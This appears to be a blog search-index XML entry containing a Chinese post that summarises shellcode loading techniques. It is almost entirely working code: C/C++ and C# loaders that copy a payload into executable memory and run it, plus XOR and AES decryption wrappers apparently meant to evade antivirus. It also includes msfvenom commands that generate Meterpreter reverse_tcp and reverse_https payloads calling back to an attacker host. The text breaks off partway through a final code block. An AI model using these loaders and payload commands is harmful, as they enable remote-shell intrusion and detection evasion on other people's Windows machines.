<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[shellcode加载总结]]></title>
      <url>https://uknowsec.cn/posts/notes/shellcode%E5%8A%A0%E8%BD%BD%E6%80%BB%E7%BB%93.html</url>
      <content type="html"><![CDATA[<h2><span id="cc">C/C++</span></h2><h3><span id="源码加载">源码加载</span></h3><h4><span id="利用动态申请内存">利用动态申请内存</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">typedef void (_stdcall *CODE)();</span><br><span class="line">#pragma comment(linker,&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)</span><br><span class="line">unsigned char shellcode[] =&quot;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    PVOID p = NULL;</span><br><span class="line">    p = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    if (p == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    memcpy(p, shellcode, sizeof(shellcode));</span><br><span class="line">    </span><br><span class="line">    CODE code = (CODE)p;</span><br><span class="line">    code();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4><span id="强制类型转换成函数指针">强制类型转换成函数指针</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#pragma comment(linker,&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)</span><br><span class="line">unsigned char shellcode[] =&quot;&quot;;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">   ((void(WINAPI*)(void))&amp;shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4><span id="嵌入式汇编呼叫shellcode">嵌入式汇编呼叫shellcode</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#pragma comment(linker, &quot;/section:.data,RWE&quot;)</span><br><span class="line">unsigned char shellcode[] =&quot;&quot;;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        mov eax, offset shellcode</span><br><span class="line">        jmp eax</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4><span id="伪指令">伪指令</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#pragma comment(linker, &quot;/section:.data,RWE&quot;)</span><br><span class="line">unsigned char shellcode[] =&quot;&quot;;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        mov eax, offset shellcode</span><br><span class="line">        _emit 0xFF  </span><br><span class="line">        _emit 0xE0</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4><span id="xor加密">xor加密</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">Author: Arno0x0x, Twitter: @Arno0x0x</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line"></span><br><span class="line">	// Encrypted shellcode and cipher key obtained from shellcode_encoder.py</span><br><span class="line">	char encryptedShellcode[] = &quot;&quot;;</span><br><span class="line">	char key[] = &quot;uknowsec&quot;;</span><br><span class="line">	char cipherType[] = &quot;xor&quot;;</span><br><span class="line"></span><br><span class="line">	// Char array to host the deciphered shellcode</span><br><span class="line">	char shellcode[sizeof encryptedShellcode];	</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	// XOR decoding stub using the key defined above must be the same as the encoding key</span><br><span class="line">	int j = 0;</span><br><span class="line">	for (int i = 0; i &lt; sizeof encryptedShellcode; i++) &#123;</span><br><span class="line">		if (j == sizeof key - 1) j = 0;</span><br><span class="line"></span><br><span class="line">		shellcode[i] = encryptedShellcode[i] ^ key[j];</span><br><span class="line">		j++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// Allocating memory with EXECUTE writes</span><br><span class="line">	void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">	// Copying deciphered shellcode into memory as a function</span><br><span class="line">	memcpy(exec, shellcode, sizeof shellcode);</span><br><span class="line"></span><br><span class="line">	// Call the shellcode</span><br><span class="line">	((void(*)())exec)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shellcode_2.png" alt=""></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shellcode_4.png" alt=""></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shellcode_5.png" alt=""></p>
<h3><span id="加载器">加载器</span></h3><h4><span id="c加载shellcode方式的payload到内存">C++.加载shellcode方式的payload到内存</span></h4><p><a href="https://github.com/clinicallyinane/shellcode_launcher/" target="_blank" rel="noopener">https://github.com/clinicallyinane/shellcode_launcher/</a> </p>
<p>生成shellcode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=ip lport=port -e x86/shikata_ga_nai -i 5 -f raw &gt; test.c</span><br></pre></td></tr></table></figure>
<p>shellcode 加载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode_launcher.exe -i test.c</span><br></pre></td></tr></table></figure></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shellcode_6.png" alt=""></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shellcode_7.png" alt=""></p>
<h4><span id="c以十六进制的方式执行shellcode">C以十六进制的方式执行shellcode</span></h4><p><a href="https://github.com/DimopoulosElias/SimpleShellcodeInjector" target="_blank" rel="noopener">https://github.com/DimopoulosElias/SimpleShellcodeInjector</a></p>
<p>生成shellcode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_https LHOST=1.2.3.4 LPORT=443 -f c -o msf.txt</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat msf.txt|grep -v unsigned|sed &quot;s/\&quot;\\\x//g&quot;|sed &quot;s/\\\x//g&quot;|sed &quot;s/\&quot;//g&quot;|sed &apos;:a;N;$!ba;s/\n//g&apos;|sed &quot;s/;//g&quot;</span><br></pre></td></tr></table></figure>
<p>加载shellcode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssi.exe shellcode</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shellcode_8.png" alt=""></p>
<h2><span id="c">C</span></h2><h3><span id="源码加载">源码加载</span></h3><h4><span id="直接加载">直接加载</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">using System;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line">namespace TCPMeterpreterProcess</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            // native function’s compiled code</span><br><span class="line">            // generated with metasploit</span><br><span class="line">            byte[] shellcode = new byte[333] &#123;</span><br><span class="line">            </span><br><span class="line">            &#125;;</span><br><span class="line">            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,</span><br><span class="line">            MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);</span><br><span class="line">            IntPtr hThread = IntPtr.Zero;</span><br><span class="line">            UInt32 threadId = 0;</span><br><span class="line">            // prepare data</span><br><span class="line">            IntPtr pinfo = IntPtr.Zero;</span><br><span class="line">            // execute native code</span><br><span class="line">            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">            WaitForSingleObject(hThread, 0xFFFFFFFF);</span><br><span class="line">            &#125;</span><br><span class="line">                    private static UInt32 MEM_COMMIT = 0x1000;</span><br><span class="line">            private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;</span><br><span class="line">            [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">                    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,</span><br><span class="line">            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);</span><br><span class="line">            [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">                    private static extern bool VirtualFree(IntPtr lpAddress,</span><br><span class="line">            UInt32 dwSize, UInt32 dwFreeType);</span><br><span class="line">            [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">                    private static extern IntPtr CreateThread(</span><br><span class="line">            UInt32 lpThreadAttributes,</span><br><span class="line">            UInt32 dwStackSize,</span><br><span class="line">            UInt32 lpStartAddress,</span><br><span class="line">            IntPtr param,</span><br><span class="line">            UInt32 dwCreationFlags,</span><br><span class="line">            ref UInt32 lpThreadId</span><br><span class="line">            );</span><br><span class="line">            [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">                    private static extern bool CloseHandle(IntPtr handle);</span><br><span class="line">            [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">                    private static extern UInt32 WaitForSingleObject(</span><br><span class="line">            IntPtr hHandle,</span><br><span class="line">            UInt32 dwMilliseconds</span><br><span class="line">            );</span><br><span class="line">            [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">                    private static extern IntPtr GetModuleHandle(</span><br><span class="line">            string moduleName</span><br><span class="line">            );</span><br><span class="line">            [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">                    private static extern UInt32 GetProcAddress(</span><br><span class="line">            IntPtr hModule,</span><br><span class="line">            string procName</span><br><span class="line">            );</span><br><span class="line">            [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">                    private static extern UInt32 LoadLibrary(</span><br><span class="line">            string lpFileName</span><br><span class="line">            );</span><br><span class="line">            [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">                    private static extern UInt32 GetLastError();</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Threading;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line">namespace MSFWrapper</span><br><span class="line">&#123;</span><br><span class="line">    public class Program</span><br><span class="line">    &#123;</span><br><span class="line">        public Program()</span><br><span class="line">        &#123;</span><br><span class="line">           RunMSF();</span><br><span class="line">        &#125;</span><br><span class="line">        public static void RunMSF()</span><br><span class="line">        &#123;</span><br><span class="line">            byte[] MsfPayload = &#123;</span><br><span class="line">            //Paste your Payload here</span><br><span class="line">        &#125;;</span><br><span class="line">            IntPtr returnAddr = VirtualAlloc((IntPtr)0, (uint)Math.Max(MsfPayload.Length, 0x1000), 0x3000, 0x40);</span><br><span class="line">            Marshal.Copy(MsfPayload, 0, returnAddr, MsfPayload.Length);</span><br><span class="line">            CreateThread((IntPtr)0, 0, returnAddr, (IntPtr)0, 0, (IntPtr)0);</span><br><span class="line">            Thread.Sleep(2000);</span><br><span class="line">        &#125;</span><br><span class="line">        public static void Main()</span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);</span><br><span class="line">        [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>保存代码后，修改该工程的属性，将输出类型改为“Windows 应用程序”，启动对象改为“MSFWrapper.Program”并保存。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shellcode_1.png" alt=""></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shellcode_3.png" alt=""></p>
<h4><span id="aes加密">aes加密</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">Author: Arno0x0x, Twitter: @Arno0x0x</span><br><span class="line"></span><br><span class="line">How to compile:</span><br><span class="line">===============</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:encryptedShellcodeWrapper_aes.exe encryptedShellcodeWrapper_aes.cs</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">using System;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Threading.Tasks;</span><br><span class="line">using System.Security.Cryptography;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line">namespace RunShellCode</span><br><span class="line">&#123;</span><br><span class="line">    static class Program</span><br><span class="line">    &#123;</span><br><span class="line">        //==============================================================================</span><br><span class="line">        // CRYPTO FUNCTIONS</span><br><span class="line">        //==============================================================================</span><br><span class="line">        private static T[] SubArray&lt;T&gt;(this T[] data, int index, int length)</span><br><span class="line">        &#123;</span><br><span class="line">            T[] result = new T[length];</span><br><span class="line">            Array.Copy(data, index, result, 0, length);</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private static byte[] xor(byte[] cipher, byte[] key) &#123;</span><br><span class="line">            byte[] decrypted = new byte[cipher.Length];</span><br><span class="line"></span><br><span class="line">            for(int i = 0; i &lt; cipher.Length; i++) &#123;</span><br><span class="line">                decrypted[i] = (byte) (cipher[i] ^ key[i % key.Length]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return decrypted;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //--------------------------------------------------------------------------------------------------</span><br><span class="line">        // Decrypts the given a plaintext message byte array with a given 128 bits key</span><br><span class="line">        // Returns the unencrypted message</span><br><span class="line">        //--------------------------------------------------------------------------------------------------</span><br><span class="line">        private static byte[] aesDecrypt(byte[] cipher, byte[] key)</span><br><span class="line">        &#123;</span><br><span class="line">            var IV = cipher.SubArray(0, 16);</span><br><span class="line">            var encryptedMessage = cipher.SubArray(16, cipher.Length - 16);</span><br><span class="line"></span><br><span class="line">            // Create an AesManaged object with the specified key and IV.</span><br><span class="line">            using (AesManaged aes = new AesManaged())</span><br><span class="line">            &#123;</span><br><span class="line">                aes.Padding = PaddingMode.PKCS7;</span><br><span class="line">                aes.KeySize = 128;</span><br><span class="line">                aes.Key = key;</span><br><span class="line">                aes.IV = IV;</span><br><span class="line"></span><br><span class="line">                using (MemoryStream ms = new MemoryStream())</span><br><span class="line">                &#123;</span><br><span class="line">                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))</span><br><span class="line">                    &#123;</span><br><span class="line">                        cs.Write(encryptedMessage, 0, encryptedMessage.Length);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    return ms.ToArray();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //==============================================================================</span><br><span class="line">        // MAIN FUNCTION</span><br><span class="line">        //==============================================================================</span><br><span class="line">        static void Main()</span><br><span class="line">        &#123;</span><br><span class="line">            byte[] encryptedShellcode = new byte[] &#123; &#125;;</span><br><span class="line">            string key = &quot;Nv78rga+vzeTO+acx4EXCw==&quot;;</span><br><span class="line">            string cipherType = &quot;aes&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            byte[] shellcode = null;</span><br><span class="line"></span><br><span class="line">            //--------------------------------------------------------------</span><br><span class="line">            // Decrypt the shellcode</span><br><span class="line">            if (cipherType == &quot;xor&quot;) &#123;</span><br><span class="line">                shellcode = xor(encryptedShellcode, Encoding.ASCII.GetBytes(key));</span><br><span class="line">            &#125;</span><br><span class="line">            else if (cipherType == &quot;aes&quot;) &#123;</span><br><span class="line">                shellcode = aesDecrypt(encryptedShellcode, Convert.FromBase64String(key));</span><br><span class="line">            &#125;</span><br><span class="line">                        </span><br><span class="line">            //--------------------------------------------------------------        	</span><br><span class="line">            // Copy decrypted shellcode to memory</span><br><span class="line">            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);</span><br><span class="line">            IntPtr hThread = IntPtr.Zero;</span><br><span class="line">            UInt32 threadId = 0;</span><br><span class="line"></span><br><span class="line">            // Prepare data</span><br><span class="line">            IntPtr pinfo = IntPtr.Zero;</span><br><span class="line"></span><br><span class="line">            // Invoke the shellcode</span><br><span class="line">            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">            WaitForSingleObject(hThread, 0xFFFFFFFF);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private static UInt32 MEM_COMMIT = 0x1000;</span><br><span class="line">        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;</span><br><span class="line"></span><br><span class="line">        // The usual Win32 API trio functions: VirtualAlloc, CreateThread, WaitForSingleObject</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 VirtualAlloc(</span><br><span class="line">            UInt32 lpStartAddr,</span><br><span class="line">            UInt32 size,</span><br><span class="line">            UInt32 flAllocationType,</span><br><span class="line">            UInt32 flProtect</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern IntPtr CreateThread(</span><br><span class="line">            UInt32 lpThreadAttributes,</span><br><span class="line">            UInt32 dwStackSize,</span><br><span class="line">            UInt32 lpStartAddress,</span><br><span class="line">            IntPtr param,</span><br><span class="line">            UInt32 dwCreationFlags,</span><br><span class="line">            ref UInt32 lpThreadId</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 WaitForSingleObject(</span><br><span class="line">            IntPtr hHandle,</span><br><span class="line">            UInt32 dwMilliseconds</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4><span id="xor加密">xor加密</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span 